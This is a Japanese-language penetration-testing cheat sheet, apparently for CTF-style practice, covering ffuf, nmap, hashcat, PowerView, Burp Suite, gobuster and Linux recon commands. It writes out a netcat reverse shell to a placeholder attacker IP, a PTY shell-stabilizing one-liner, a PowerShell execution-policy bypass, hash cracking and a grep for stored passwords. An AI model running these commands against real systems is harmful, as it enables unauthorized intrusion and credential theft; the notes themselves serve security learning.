# ffuf

## Objective
- SQLIやXSSを見つけられる
- ffufで使われるwordlistsはただのtextファイル
- 
## Installation
- sudo apt install ffuf


## Usage
- -uで対象のURLを指定する
- -wで、使用するwordlistsを指定する
最も基本的なコマンドは以下
```
ffuf -u https://example/FUZZ/ -w ./wordlist
```

## Response
![image](https://github.com/cyber-mamba/red-teaming/assets/96987448/6d2d681b-c4d9-4bb0-aa85-edfa30a17243)


## Wordlist
wordlistの選定が超大事
良いwordlistを使えば、良いスキャン結果が返ってくる
最も一般的で良いとされているのは**SecLists**

## recursionについて
- ffufには**recursion**と**recursion-depth**を選択するための2つのフラグがある
- recursionしてスキャンする場合は、URLの指定において、**FUZZ/**ではなく**FUZZ**として、末尾にバックスラッシュを含めないことに注意

recursionは以下のようにして行う
```
ffuf -u https://example/FUZZ -w ./wordlists -recursion
```
recursionを行うと、ヒットしたディレクトリにおいて、すべてのwordを使って再度スキャンする。
例えば、https://adminでヒットしたとき、admin/をほかのwordでもスキャンするため、admin/panelのような、admin配下のパスについてもスキャン結果に含めることができる。

## Extension check
ffufのスキャンにおいて、スキャンにヒットしたファイルの拡張子を、表示するresultに含ませることもできる。
```
ffuf -u https://example/FUZZ -w ./wordlists -recursion -e .bak
```
## Sirent modeとOutput
-sをつけることで、途中経過を表示しないようにすることができる。
また、**| tee .outfile.txt**で、結果をファイルに格納させることもできるので便利。

```
ffuf -u http://example/FUZZ -w ./wordlist -s | tee outfile.txt
```

更に、出力結果は.txtに限らず、json, ejson, html, md, csv, ecsvでも出力ができる
```
ffuf -u http://exampleFUZZ -w ./wordlsit -of html -o ./outputfile
```

## Authentication
### Cookie
Webアプリケーションのファジングでは、Cookieを用いた認証をバイパスする必要があるものも多い。
多くの場合、BurpなどでCookieを取得してからVALUEにセットする。
```
ffuf -u http://example/FUZZ -w ./wordlist -of html -o ./codingo -b "NAME1=VALUE1; NAME2=VALUE2"
```

### Header Authentication
headerをカスタムするには、**-H**をつける。
```
ffuf -u http://example/FUZZ -w ./wordlist -of html -o ./codingo -H "NAME1=VALUE1; NAME2=VALUE2"
```

### リクエスト速度の調整
**p**フラグによって、リクエスト間隔を調整できる。以下の場合、0.8から1.2秒間につき1度リクエストを送ることになる。
```
ffuf -u https://example/FUZZ -w ./wordlist -p '0.8-1.2'
```

## ステータスコードについて
FFUFでスキャンした後、返ってきたステータスコードを確認したほうが良いときと、確認する必要がないノイズである可能性が高いものがある。
参照：https://josephthacker.com/hacking/2020/10/27/ffuf-filters.html

### 確認すべきステータスコード
- 200
- 301
- 429 => これを見たら、スキャンの速度を落とす
- 500 => 熱い。これを見つけたらそこのAPIに対してパラメータを色々送ってみるとよい

### ノイズとなるステータスコード

# Nmap
```
nmap -sC -sV -oA nmap/active <IP>
```
-sV -> バージョン列挙
-sC -> 組み込みスクリプトを自動で選択
-oA -> なんか出力をフォーマットして、続く場所に保存するやつ。今回だと**less nmap/active.nmap**で見れる。


# smbmap
着眼点
- samba内のGroups.xmlで、ローカルアカウント内のグループポリシー設定を見れる
- smbでつないでrootパスワード分からないときはとりあえず**Anonymous login**

# Bloodhound
着眼点


# hashcat
ファイルは以下のように.txtに保存する。:dはソルトがあるときに利用する。
```
<hash_value>:d
```
-mでモードを選択、120はsaltされたSHA1を指す。ソルトされていなければ-m 100でいい。
-a 3はブルートフォースモード、0にすると辞書攻撃になる。困ったらとりあえずrockyou.txtでいいかも。
```
hashcat -m 120 -a 0 hash.txt wordlists.txt
```


# PowerView
PowerShellを使ってWindows環境の横展開などの際に情報を収集目的で使うツール。
基本的に、Domain Adminsグループに属しているユーザー(ドメイン管理者)の資格情報を窃取できれば、DCを侵害してドメインに属するすべての端末を掌握できる。
そのため情報収集では、いかにDomain Adiminsグループに属しているユーザーの資格情報を見つけるかが重要。
cmd.exeを管理者権限で立ち上げて、PowerShellの実行ポリシーがデフォルトでRestrictedになっているので、制限を一時的にバイパスする。
```
powershell -ExecutionPolicy Bypass
```

PowerShell上でPowerViewコマンドレットを利用可能にするためにモジュールをインポートする。
```
Import-Module .\PowerView.ps1
```

カレントユーザーがローカルの管理者としてアクセス可能なドメイン上の端末を列挙する
ここで、すでに侵害している端末以外が表示されたら熱い。
```
Find-LocalAdminAccess
```

指定したローカルグループに所属するメンバーを列挙する。Administratorsの部分が指定するローカルグループ名。
```
Get-LocalGroupMember Administrators
```

指定したドメイングループのユーザーを列挙する。
```
Get-NetGroupMember "Risk Management"
```

現在ログイン中のドメインユーザに関する情報を取得する。
ユーザー名やグループ名を指定して特定メンバーに関する情報のみを収集することもできるが、デフォルトではドメイン管理者の情報を列挙する。
```
Invoke-UserHunter
```

# Burp Suite
プロキシ。ProxyでInterceptしたリクエストをIntruderやRepeaterに送ると便利。

- Repeater -> 一つのエンドポイントに対して、微妙なリクエストの返歌とレスポンスを見たいときに便利。
- Intruder -> 特に、Payloadsを送信してFuzzingするときに便利。Sniper,Battering Ram,Pitch Fork, Cluster Bombの種類がある。それぞれについては後述。

## Sniper
一つのエンドポイントに対して、変数のうち一つだけペイロードをセット可能。

## Battering Ram
Sniperと同じくペイロードは一つ二元呈されているが、リクエストないのすべてのエンドポイントでそのペイロードを実行する。
例として、リクエスト内のいくつかの入力位置でSQLiをテストしていた場合、それらすべてにペイロードをセットできるので、ButteringRumが便利。

## Pitchfork
複数のペイロードの組み合わせを同時にテストするために利用する。
例として、ユーザ名とパスワードの組み合わせリストが手元にある場合、2つのペイロードを一緒に使用できる。

## Cluster Bomb
パスワードスプレーなどで使える。

# Postman

# nikto
脆弱性スキャンツール。
ターゲットホストであるWebアプリケーション上に脆弱性が内科をスキャンしてチェックする。
```
nikto -h http://<IP>:<Port>
```

# Google Hacking

# Nikto
Webアプリケーションの脆弱性をスキャンするツール。
偵察段階で有効。Webアプリケーションを見つけて脆弱性を探そうとする場合、とりあえずスキャンしてみるという使い方もあり。もちろん許可はある前提で。

ドメインをスキャンするコマンド
```
nikto -h https://example.com
```

# OWASP Amass
対象のドメイン情報があれば、対象のAttack Surfaceとなるようなドメイン・サブドメイン情報をインターネットソースから取得し、ターゲットのURLやAPIノリスとを作成する事ができる。

# Kiterunner
Goでかかれており、APIリソースを見つけるためのツール。毎秒30,000リクエストを送ってスキャン可能だが、レート制限やWAF、ロードバランサーを回避できる設計になっているらしい。
dirbuster, dirb, Gobuster, dirsearchなどのルールよりも検索能力が優れている。このツールは、APIエンドポイントやリソースを見つけることに特価した単語リスト、リクエストメソッド、パラメータ、ヘッダ、パス構造となっている。
APIとリソースのスキャンにはワードリストを利用する。
simple scan
```
kr scan https://example.com:443 -A raft-small-words
```


# Wfuzz
ffufみたいなFuzzingツール。

# Arjun

# Chrome DevTools
- Networkタブに移動して、Ctrl+Rでページを更新する。
- APIというタイトルのファイルがあれば確認する。
- おもしろそうなJavaScriptのファイルを右クリックし、Open in Sources Panelをクリックし、ソースコードを表示する。
- JavaScriptファイル内にて、API, APIkey, secret, password等の文字列でヒットするものを検索してみる。JavaScriptファイルからAPIの利用を見つけられると良い。
- Memoryタブに移動-> Heap snapshot->Select JavaScript VM instance-> Take snapshotで、.jsのファイルをコンパイルしてスナップショットを作成する。
- スナップショットにおいて、api, v1, v2, swagger, rest, devといった一般的なAPIパスの用語を利用して検索することで、対象のWebアプリケーションがどのようにAPIを利用しているかがわかりやすくなる。この方法で、APIの存在とそのパスを発見することに役立つ。また、ゲスト、認証済み、管理者といった異なるユーザで作成したスナップショットにおいて、異なるAPIが利用されているといったことを把握するにも役立つ。
- Performanceタブにおいて、ボタンのクリックなど特定のアクションを記録紙、タイムライン上で特定のWebページで開始したイベントがバックグラウンドでAPIリクエストを実行しているかを判別できる。
- 

--scで200のレスポンスのみ表示、-Hでヘッダーを設定、FUZZの部分にwordlistのワードが入る。-uで対象URLを設定。-pで自身のプロキシを経由するよう設定。-sでリクエスト間の時間を0.25秒に設定。
```
sudo wfuzz -c -f sub-fighter -Z -w <path_to_wordlist> --sc 200  --hw 0 -s 0.25 -H "Host: FUZZ.www.example.com" -u https://example.com -p 127.0.0.1:8080
```

# Gobuster
ディレクトリの列挙。-tでスレッドを50に設定、-kで証明書エラーを無視、-b 302でこのステータスコードを結果から除外

```
sudo gobuster dir -u https://example.htb/ -w /wordommon.txt -t 50 -x php,html -k -b 302 | tee resutl_gobuster.txt
```

# NetCat
リバースシェル待ち受け
```
nc -lvnp 4444
```

ターゲットから自サーバにリバースシェル投げる、-eで接続できたときに引数のプログラムを実行する、/bin/shは-eの引数で、接続確立後にターゲットの/bin/shを実行してシェルをattackerから動かせるようにする。
```
nc -e /bin/sh <attackerIP> <attakerPort>
```


# OneLinner
よくあるPythonのスクリプト
```
python exploit.py --command `nc -e /bin/sh <attackerIP> <attackerPort>`
```

リバースシェルをとったあとにシェルを安定させるためのPythonスクリプト
ptyモジュールで擬似端末(pty)サブシステムへのインターフェースとやらを提供、これでシェルが安定する。
-cでコマンドから直接pythonを動かすということになる。
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```


# Linuxコマンド
/から再帰的に検索、-nameで、findの対象がファイルであることを指定、'user.txt'は'*.txt'のように正規表現も可能、2>de/nullは、標準エラー出力である2を、/dev/nullというLinuxのスペシャルファイル(そこに書き込まれたデータをすべて捨てる)に出力するコマンド。
これにより、ログイン中のユーザ権限で閲覧可能なもののみ表示される。
```
find / -name 'user.txt' 2>/dev/null
```

OS情報を収集する
```
uname -a
```
```
cat /etc/*release*
```
実行中のジョブを確認する
```
ps aux
```
インストールされているアプリケーションとバージョンを確認し、既知の脆弱性が無いかを確認し、権限昇格に使えないか調べる
```
dpkg -l
```
カレントディレクトリ直下にあるファイルの数をカウントする。
-laで隠しファイルを含む、grep -v '^d'で、行の先頭にd(ディレクトリ)がある行を除外することで、対象をファイルのみにする、wc -lで行数をカウントする
```
ls -la | grep -v '^d' | wc -l
```
grepでファイル内のテキストを検索、
-aでテキストとして扱えないバイナリもテキストとして検索、-rで再帰的に検索、-iで大文字小文字の区別をなくす(Passwordとpassword、PASSWORDを検索できる)
-nで一致した行の行番号を表示、-oで一致した部分のみ表示、-Eで拡張正規表現を使用、
'\w+で一つ以上の単語文字(英数字及びアンダースコア)に一致、'\W+で一つ以上の非単語文字(スペース、記号等)に一致、{0,5}で、直前の要素が0回から5階の間に現れることを意味
最後の . で、「現在のディレクトリ」を指定する
要約すると、passwordの前後に最大5単語までの任意の文字(単語文字と非単語)を含む文字列に一致して検索する。
```
grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' .
```

# Hash-Identifier
取得したハッシュの形式を特定する。
以下コマンドでhash-identifierを実行。
```
hash-identifier <target_HASH>
```

# SCP
リモートからローカルにコピーする
```
scp ユーザ名@リモートのホスト名:コピーしたいリモートのファイル ローカルのコピー先

scp user@remoteHost:/home/user/test.txt /local/path
```
ローカルからリモートにコピーする
```
scp コピーしたいローカルのファイルパス ユーザ名@リモートのホスト名:保存したいパス

scp /local/test.txt user@remoteHost:/home/user/tmp/
```

# Cherrytree







